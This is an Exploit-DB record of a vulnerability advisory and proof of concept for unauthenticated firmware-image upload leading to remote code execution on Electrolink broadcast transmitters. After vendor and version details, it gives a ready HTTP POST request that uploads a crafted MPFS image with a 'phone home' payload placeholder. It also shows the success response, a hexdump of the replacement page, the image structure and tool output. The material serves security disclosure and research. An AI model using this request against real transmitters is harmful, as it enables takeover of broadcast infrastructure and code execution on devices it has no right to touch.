{"source": "https://www.exploit-db.com/exploits/51775", "vulnName": "Electrolink FM/DAB/TV Transmitter - Pre-Auth MPFS Image Remote Code Execution", "vulnEDBID": "51775", "vulnCVE": "N/A", "author": "LIQUIDWORM", "exploitType": "WEBAPPS", "platform": "HARDWARE", "datePublished": "2024-02-02", "vulnContent": "Electrolink FM/DAB/TV Transmitter Pre-Auth MPFS Image Remote Code Execution\n\n\nVendor: Electrolink s.r.l.\nProduct web page: https://www.electrolink.com\nAffected version: 10W, 100W, 250W, Compact DAB Transmitter\n                  500W, 1kW, 2kW Medium DAB Transmitter\n                  2.5kW, 3kW, 4kW, 5kW High Power DAB Transmitter\n                  100W, 500W, 1kW, 2kW Compact FM Transmitter\n                  3kW, 5kW, 10kW, 15kW, 20kW, 30kW Modular FM Transmitter\n                  15W - 40kW Digital FM Transmitter\n                  BI, BIII VHF TV Transmitter\n                  10W - 5kW UHF TV Transmitter\n                  Web version: 01.09, 01.08, 01.07\n                  Display version: 1.4, 1.2\n                  Control unit version: 01.06, 01.04, 01.03\n                  Firmware version: 2.1\n\nSummary: Since 1990 Electrolink has been dealing with design and\nmanufacturing of advanced technologies for radio and television\nbroadcasting. The most comprehensive products range includes: FM\nTransmitters, DAB Transmitters, TV Transmitters for analogue and\ndigital multistandard operation, Bandpass Filters (FM, DAB, ATV,\nDTV), Channel combiners (FM, DAB, ATV, DTV), Motorized coaxial\nswitches, Manual patch panels, RF power meters, Rigid line and\naccessories. A professional solution that meets broadcasters needs\nfrom small community television or radio to big government networks.\n\nCompact DAB Transmitters 10W, 100W and 250W models with 3.5\"\ntouch-screen display and in-built state of the art DAB modulator,\nEDI input and GPS receiver. All transmitters are equipped with a\nstate-of-the art DAB modulator with excellent performances,\nself-protected and self-controlled amplifiers ensure trouble-free\nnon-stop operation.\n\n100W, 500W, 1kW and 2kW power range available on compact 2U and\n3U 19\" frame. Built-in stereo coder, touch screen display and\nefficient low noise air cooling system. Available models: 3kW,\n5kW, 10kW, 15kW, 20kW and 30kW. High efficiency FM transmitters\nwith fully broadband solid state amplifiers and an efficient\nlow-noise air cooling system.\n\nFM digital modulator with excellent specifications, built-in\nstereo and RDS coder. Digital deviation limiter together with\nASI and SDI inputs are available. These transmitters are ready\nfor ISOFREQUENCY networks.\n\nAvailable for VHF BI and VHF BIII operation with robust desing\nand user-friendly local and remote control. Multi-standard UHF\nTV transmitters from 10W up to 5kW with efficient low noise air\ncooling system. Analogue PAL, NTSC and Digital DVB-T/T2, ATSC\nand ISDB-Tb available.\n\nDesc: The device allows access to an unprotected endpoint that\nallows MPFS File System binary image upload without authentication.\nThe MPFS2 file system module provides a light-weight read-only\nfile system that can be stored in external EEPROM, external\nserial Flash, or internal Flash program memory. This file system\nserves as the basis for the HTTP2 web server module, but is also\nused by the SNMP module and is available to other applications\nthat require basic read-only storage capabilities. This can be\nexploited to overwrite the flash program memory that holds the\nweb server's main interfaces and execute arbitrary code.\n\nTested on: Mbedthis-Appweb/12.5.0\n           Mbedthis-Appweb/12.0.0\n\n\nVulnerability discovered by Gjoko 'LiquidWorm' Krstic\nMacedonian Information Security Research & Development Laboratory\nZero Science Lab - https://www.zeroscience.mk - @zeroscience\n\n\nAdvisory ID: ZSL-2023-5796\nAdvisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2023-5796.php\n\nRef: https://documentation.help/Microchip-TCP.IP-Stack/GS-MPFSUpload.html\n\n30.06.2023\n\n--\n\n\nPOST /upload HTTP/1.1\nHost: 192.168.150.77:8888\nContent-Length: 251\nCache-Control: max-age=0\nContent-Type: multipart/form-data; boundary=----joxypoxy\nUser-Agent: MPFS2_PoC/1.0c\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: Login=IgnoreMePlsKtnx\nConnection: close\n\n------joxypoxy\nContent-Disposition: form-data; name=\"i\"; filename=\"MPFSimg.bin\"\nContent-Type: application/octet-stream\n\nMPFS...<CGI BINARY PHONE HOME>\n-----joxypoxy--\n\n\nHTTP/1.1 200 OK\nConnection: close\nContent-Type: text/html\n\n<html><body style=\"margin:100px\"><b>MPFS Update Successful</b><p><a href=\"/\">Site main page</a></body></html>\n\n\n---\n\nhd htm:\n0d 0a 4d 50 46 53 02 01  01 00 8a 43 20 00 00 00  MPFS.......C....\n2b 00 00 00 30 00 00 00  02 44 eb 64 00 00 00 00  +...0....D.d....\n00 00 69 6e 64 65 78 32  2e 68 74 6d 00 3c 68 74  ..index0.htm.<ht\n6d 6c 3e 0d 0a 3c 74 69  74 6c 65 3e 5a 53 4c 3c  ml>..<title>ZSL<\n...\n...\n64 6f 73 21 0d 0a 3c 2f  68 74 6d 6c 3e 0d 0a 2d  dos!..</html>..-\n\n---\n\nMPFS Structure:\n     [M][P][F][S]\n     [BYTE Ver Hi][BYTE Ver Lo][WORD Number of Files]\n     [Name Hash 0][Name Hash 1]...[Name Hash N]\n     [File Record 0][File Record 1]...[File Record N]\n     [String 0][String 1]...[String N]\n     [File Data 0][File Data 1]...[File Data N]\n\n\n---\n\nC:\\>javaw -jar MPFS2.jar\nC:\\>mpfs2 -v -l MPFSimg.bin\nVersion: 2.1\nNumber of files: 1 (1 regular, 0 index)\nNumber of dynamic variables: 0\n\nFileRecord 0:\n    .StringPtr = 32 index0.htm\n    .DataPtr   = 43\n    .Len       = 48\n    .Timestamp = 2023-08-27T14:39:30Z\n    .Flags     = 0\n            "}